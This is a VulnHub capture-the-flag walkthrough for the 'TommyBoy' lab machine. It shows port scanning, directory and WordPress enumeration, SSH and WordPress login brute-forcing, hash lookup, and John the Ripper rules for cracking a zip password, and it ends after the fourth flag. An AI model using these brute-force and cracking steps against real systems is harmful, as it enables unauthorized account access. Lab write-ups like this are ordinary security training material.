# VulnHub Walkthrough: 👦 TommyBoy

TommyBoy Walkthrough

### Details
* Name: TommyBoy ([VulnHub](https://www.vulnhub.com/entry/tommy-boy-1,157/))
* Goal: Find the 5 flags, get the homepage up, & get root access.


### Network Scan

```bash
# Scan ports 0-65535
nmap -A -p0-65535 192.168.1.10

# Scan all ports, enumerate HTTP, etc.
sudo nmap -sC -sV -A -O -p- -T4 -script http-enum 192.168.1.10
```

Discovered open ports:
* 22: *SSH*
* 80: *HTTP*
* 8008: *HTTP*

From the first nmap scan, we immediately are able to see the location of **Flag 1**, */flag-numero-uno.txt*.
Then by going to `http://192.168.1.10/flag-numero-uno.txt` we get:
* `Flag 1: B34rcl4ws`

Additionally, we notice that port 22 is open, so we can try and use the [ssh-brute](https://nmap.org/nsedoc/scripts/ssh-brute.html) script within nmap to brute force the SSH login:
```bash
nmap -A --script ssh-brute 192.168.1.10 -p 22 
```


### HTTP directory enumeration

```bash
# Gobuster scan: Medium wordlist
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e -t 20 -u http://192.168.1.10

# Gobuster scan: Large wordlist
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -e -t 20 -u http://192.168.1.10

# Nikto scan
nikto -h http://192.168.1.10

# dirb scan
dirb http://192.168.1.10
```


We first visit the main website on port 80, `http://192.168.1.10:80`, and once we look through the source code, we find a hint between a commented conversation regarding a hidden blog.
```txt
<!--Comment from Nick: Seriously? You losers are hopeless. We hid it in a folder named after the place you noticed after you and Tom Jr. had your big fight. You know, where you cracked him over the head with a board. It's here if you don't remember: https://www.youtube.com/watch?v=VUxOd4CszJ8--> 
```

Once we visit the video link, we are able to see that the location that they are speaking of is "Prehistoric Forest".

With this is in mind, we then attempt to visit that directory on the website, `http://192.168.1.10:80/prehistoricforest/`, and we are greeted with a blog page.


While we explore the website, we can go ahead and re-deploy a web scan using the specific directory, */prehistoricforest/*, to see if there are any hidden directories or files.
```bash
# gobuster scan
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e -t 20 -u http://192.168.1.10/prehistoricforest/

# nikto scan
nikto -h http://192.168.1.10/prehistoricforest/
```

From the gobuster scan, we find 3 hidden directories:
* */prehistoricforest/wp-content*
* */prehistoricforest/wp-includes*
* */prehistoricforest/wp-admin*

As for the nikto scan, we find the following directories (similar to gobuster):
* */prehistoricforest/wp-links-opml.php*
* */prehistoricforest/license.txt* (not useful)
* */prehistoricforest/wp-login.php*

From here we are able to tell that we have a Wordpress website. This allows us to then use `wpscan` to enumerate the website for users as well as other vulnerabilities:
```bash
wpscan --url http://192.168.1.10/prehistoricforest/ -e u1-5
```

From the `wpscan` scan, we are able to find the following users:
* tommy
* richard
* tom
* Tom Jr.
* Big Tom
* michelle

### Website Exploration

From here I began to explore the blog page, and found a flag hidden in the comments section of a blog post titled "Announcing the Callaham internal company blog!". The comment is a hint in regards to the location of the second flag, ***Flag 2: thisisthesecondflagyayyou.txt***. When we go to this directory (http://192.168.1.10/prehistoricforest/thisisthesecondflagyayyou.txt), we get:
* `Flag 2: Z4l1nsky`


Next, I found a blog post that requires a password in order to view, to that of which I did not have. However, I later found another blog post titled "SON OF A!", that contained a hint as to where I could possibly find the password for the locked blog post. The comment literally says that the hint for the password is located in the `/richard` directory.

In this directory (http://192.168.1.10/richard), there is simply an image. I then decided to download the image to check if there is anything hidden within the metadata.
```bash
exiftool shockedrichard.jpg
```

Surely enough I found something interesting within the metadata:
* `User comment:  ce154b5a8e59c89732bc25d6a2e6b90b`

Then using [hashes.com](https://hashes.com), I was able to find the following sequence:
* `ce154b5a8e59c89732bc25d6a2e6b90b` --> `7370616e6b79` (MD5 plain)
* `7370616e6b79` (MD5 plain) --> `7370616e6b79` (Hex)
* `7370616e6b79` (Hex) --> `spanky` (ASCII)

With this, we now have the password to the locked blog post. Throughout this specific blog post, there is a bunch of help information. One thing in particular is that ftp has been forward to different port, which the blog author has mentioned is located in *a port that most scanners would get exhausted looking for*. They also mention that the username for their account is *nickburns* with "an easy to guess password".

Additionally, the post mentions that there is a file called *callahanbak.bak* that will need to be remained to *index.html* which will fix the homepage.

### WPS Password Cracking

Similar to the command we used earlier to look for users, i also used the following command to look for the passwords of those users:
```bash
wpscan --url http://192.168.1.10/prehistoricforest/ -e u1-5 --passwords /usr/share/wordlists/rockyou.txt
```

Over time, I was able to find the WordPress login password for the user *tom*:
* `tom: tomtom1`

Once logged in, I noticed that there was a draft post containing the second half of tom's password for the ssh server: `1938!!`.

### FTP Enumeration

One thing that I noticed when I went to tom's profile is that his email belonged to the *callahanauto.tb* domain. Having seen this I then mapped the websites ip address to that domain via the `/etc/hosts` file:
```bash
192.168.1.10 callahanauto.tb
```

Once I did this, I then ran a nmap scan using the domain name, and immediately I found the hidden port that nickburns was speaking of:
```bash
nmap -A -p0-65535 callahanauto.tb
```

This revealed a new open port that was not previously found, port 65534.

I then used the ftp command to connect to the ftp server:
```bash
ftp 192.168.1.10 65534
ftp>Name: nickburns
ftp>Password: nickburns
```

From here, I was able to explore the ftp server and found a file called *readme* to which I downloaded:
```bash
ftp> get readme.txt
```

From the readme file, I found out that there is a sub-folder called "NickIzL33t" that contains a encrypted zip as well as a file that contains a hint to the password.


### Physical Box Exploration

So this part may be considered cheating I believe. I figured since I obtained the login creditials for nickburns that I could use them to login to the physical box itself, which worked.

Once in, I was able to find the third flag hidden in the `/var/thatsg0nnaleaveamark/NickIzL33t/` directory titled *flag3.txt*:
* `Flag 3: TinyHead`

### Zip File Decryption

From within the same directory I found the files that nickburns was speaking of, the encrypted zip and the hint file. 

The hint file mentioned that the password for the zip file contained the following requirements:
* 13 characters long
* begins with wife's nickname - "bev"
* One uppercase character
* Two numbers
* Two lowercase characters
* One symbol
* The year Tommy Boy came out in theaters (1995)

With this information, I was able to create a generate a wordlist using `john the ripper`.

Here is the rule list (john-local.conf) that I created to meet the requirements:
```txt
[List.Rules:tomtom]
$[A-Z]$[0-9]$[0-9]$[a-z]$[a-z]$[!@#$%^&*()]$[1]$[9]$[9]$[5]
```
It is worth noting that you may need to edit `/etc/john/john.conf` to include the following line:
```txt
.include './john-local.conf'
```

I then created a "wordlist" file with the following information:
```txt
bev
```
Essentially this is the beginning of the password, and then I used the rule list to generate the rest of the password.

Then I did the following to hash the zip file (so that we can crack it using john):
```bash
zip2john t0msp4ssw0rdz.zip > zip.hash
```

followed by:
```bash
john --wordlist=wordlist --stdout --rules=tomtom > longlist

john --wordlist=longlist zip.hash

john zip.hash --show
```

Boom! We have the password to the zip file, *t0msp4ssw0rdz*: `bevH00tr$1995!`.
We can now unzip the file:
```bash
unzip t0msp4ssw0rdz.zip
```
Once extracted, we get a file called *passwords.txt* containing all of the passwords for the user "tommy". We then find the **Callahan Auto Server** credentials:
* username: `bigtommysenior`
* password: `fatguyinalittlecoat`

There is a note right below the credentials that mentions that at the end of the password there are some numbers missing. This is where the second half of the password that we found earlier comes into play. The full password is: `fatguyinalittlecoat1938!!`.

### SSH Server Access

From here we can now ssh into the server:
```bash
ssh bigtommysenior@localhost
```

Once in, we can find the fourth flag in the `/home/bigtommysenior` directory, *el-flag-numero-quatro.txt*:
* `Flag 4: EditButton`
